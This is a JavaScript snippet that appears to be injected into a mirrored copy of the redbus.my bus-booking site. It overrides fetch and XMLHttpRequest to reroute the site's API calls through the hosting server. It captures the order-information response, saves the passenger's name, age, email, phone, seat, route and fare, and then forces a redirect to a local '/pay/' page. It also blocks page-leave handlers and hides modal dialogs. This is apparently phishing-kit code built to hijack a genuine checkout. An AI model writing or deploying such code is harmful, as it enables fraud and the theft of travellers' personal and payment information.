(function(){
  'use strict';

  function getUrl(input) {
    if (typeof input === 'string') return input;
    if (input instanceof Request) return input.url;
    return '';
  }
  window.addEventListener('beforeunload', function(e) { e.stopImmediatePropagation(); }, true);

  var _fetch = window.fetch;
  window.fetch = function(input, init) {
    var url = getUrl(input);
    if (url) {
      var p = url.split('?')[0];
      var stripped = url.replace(/https?:\/\/(?:www\.)?redbus\.my/gi, '');
      // /redPay/api/orderInfo: let it complete, capture JSON, then redirect
      if (p.indexOf('/redPay/api/orderInfo') !== -1) {
        var fetchCall = input instanceof Request
          ? _fetch.call(window, new Request(stripped, input))
          : _fetch.call(window, stripped, init);
        return fetchCall.then(function(r) {
          if (r.ok) return r.clone().json().then(function(data) {
            storeOrderData(data);
            location.replace('/pay/');
            return r;
          }).catch(function() { return r; });
          return r;
        });
      }
      // Strip domain for all other requests
      if (typeof input === 'string') input = stripped;
    }
    return _fetch.call(window, input, init);
  };

  var _origOpen = XMLHttpRequest.prototype.open;
  XMLHttpRequest.prototype.open = function(method, url) {
    if (typeof url === 'string') {
      url = url.replace(/https?:\/\/(?:www\.)?redbus\.my/gi, '');
    }
    return _origOpen.call(this, method, url);
  };

  function storeOrderData(data) {
    var d = data.Response || data.Data || data;
    var booking = {};
    if (d.itemInfo && d.itemInfo[0]) {
      var it = d.itemInfo[0];
      booking.busName = it.travelsName || '';
      booking.busType = it.busType || '';
      booking.departureTime = it.bpTime || '';
      booking.arrivalTime = it.dpTime || '';
      booking.depPlace = it.bpName || '';
      booking.arrPlace = it.dpName || '';
      booking.origin = it.srcName || '';
      booking.destination = it.dstName || '';
      booking.departureDate = it.doj || '';
      booking.duration = it.duration + '';
      booking.seats = it.passengers && it.passengers[0] ? it.passengers[0].seatNo : '';
      booking.passengerName = it.passengers && it.passengers[0] ? it.passengers[0].name : '';
      booking.paxAge = it.passengers && it.passengers[0] ? it.passengers[0].age : '';
      if (it.passengers && it.passengers[0] && it.passengers[0].MPaxList) {
        booking.passengerName = booking.passengerName || it.passengers[0].MPaxList['4'] || '';
        booking.email = it.passengers[0].MPaxList['5'] || '';
        booking.phone = it.passengers[0].MPaxList['6'] || '';
      }
    }
    if (d.orderFareSplit) {
      booking.amount = d.orderFareSplit.totalFare || d.orderFareSplit.totalPayable || '0';
    }
    if (d.fareBreakUp && d.fareBreakUp[0]) {
      var fb = d.fareBreakUp[0].itemFB || [];
      for (var i = 0; i < fb.length; i++) {
        if (fb[i].type === 'BASIC_FARE') booking.baseFare = fb[i].amount;
      }
    }
    if (d.custInfo) {
      booking.email = booking.email || d.custInfo.email || '';
      booking.phone = booking.phone || d.custInfo.mobile || '';
    }
    booking.currency = 'MYR';
    booking.productType = 'Bus';
    booking.pax = d.passengerCount || 1;
    try { sessionStorage.setItem('redbus_booking', JSON.stringify(booking)); } catch(ex) {}
  }

  var style = document.createElement('style');
  style.textContent = '.modal-backdrop{display:none!important}body.modal-open{overflow:auto!important}';
  document.head.appendChild(style);
})();
